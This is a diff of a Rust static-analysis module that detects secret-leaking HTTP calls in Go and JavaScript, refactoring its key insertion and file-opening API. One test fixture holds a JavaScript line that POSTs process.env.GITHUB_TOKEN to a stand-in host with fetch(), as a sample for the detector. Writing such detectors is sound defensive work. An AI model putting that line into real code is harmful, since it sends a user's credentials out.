@@ -119,7 +119,7 @@ fn emit_seeded(
         return (BTreeMap::new(), HashMap::new());
     }
     if source.len() > 2 * 1024 * 1024 {
-        values.insert("source.payload_flow.truncated", json!(true));
+        values.insert_key(value_key!("source.payload_flow.truncated"), json!(true));
         return (BTreeMap::new(), HashMap::new());
     }
     let mut a = Analysis {
@@ -284,7 +284,10 @@ fn emit_seeded(
                 startup.write_path |= summary.write_path;
             }
         }
-        values.insert("source.go.initialization_http", json!(startup.http));
+        values.insert_key(
+            value_key!("source.go.initialization_http"),
+            json!(startup.http),
+        );
         values.insert_key(
             value_key!("source.go.initialization_events"),
             json!(events_for(&startup, "<initialization>", 0)),
@@ -293,11 +296,14 @@ fn emit_seeded(
     events.sort_by_cached_key(serde_json::Value::to_string);
     events.dedup();
     values.insert_key(value_key!("source.payload_flow.events"), json!(events));
-    values.insert("source.payload_flow.truncated", json!(a.truncated));
+    values.insert_key(
+        value_key!("source.payload_flow.truncated"),
+        json!(a.truncated),
+    );
     // Top-level facts include direct calls and calls to resolved local helpers,
     // but not merely exported/uninvoked functions or constant-false branches.
     if language.is_ecmascript() {
-        values.insert("source.execution.module_http", json!(top.http));
+        values.insert_key(value_key!("source.execution.module_http"), json!(top.http));
     }
     (
         a.summaries
@@ -1151,7 +1157,7 @@ fn env_bits(name: &str) -> Bits {
 
 #[cfg(test)]
 mod tests {
-    use crate::open_with_path;
+    use crate::OpenOptions;
     use std::path::Path;
     #[test]
     fn go_package_helpers_keep_file_import_scopes_and_initialization() {
@@ -1192,7 +1198,9 @@ mod tests {
                 kinds("p.go", &source).contains("secret-http-body"),
                 "{source}"
             );
-            let parsed = open_with_path(Path::new("p.go"), source.as_bytes()).unwrap();
+            let parsed = OpenOptions::new()
+                .path(Path::new("p.go"))
+                .open(source.as_bytes());
             assert!(
                 parsed
                     .values()
@@ -1220,7 +1228,9 @@ mod tests {
         assert!(kinds("p.go", &source).contains("secret-http-body"));
     }
     fn kinds(file: &str, source: &str) -> String {
-        let parsed = open_with_path(Path::new(file), source.as_bytes()).unwrap();
+        let parsed = OpenOptions::new()
+            .path(Path::new(file))
+            .open(source.as_bytes());
         let events = parsed
             .values()
             .get("source.payload_flow.events")
@@ -1264,7 +1274,9 @@ mod tests {
         let source = format!(
             "const x={chain}; fetch('https://example.invalid',{{method:'POST',body:JSON.stringify({{token:process.env.GITHUB_TOKEN}})}});"
         );
-        let parsed = open_with_path(Path::new("index.js"), source.as_bytes()).unwrap();
+        let parsed = OpenOptions::new()
+            .path(Path::new("index.js"))
+            .open(source.as_bytes());
         assert_eq!(
             parsed.values().get("source.payload_flow.truncated"),
             Some(&serde_json::json!(false))
@@ -1393,7 +1405,9 @@ mod tests {
             ),
             ("fetch('https://example.invalid');", true),
         ] {
-            let parsed = open_with_path(Path::new("index.js"), source.as_bytes()).unwrap();
+            let parsed = OpenOptions::new()
+                .path(Path::new("index.js"))
+                .open(source.as_bytes());
             assert_eq!(
                 parsed
                     .values()
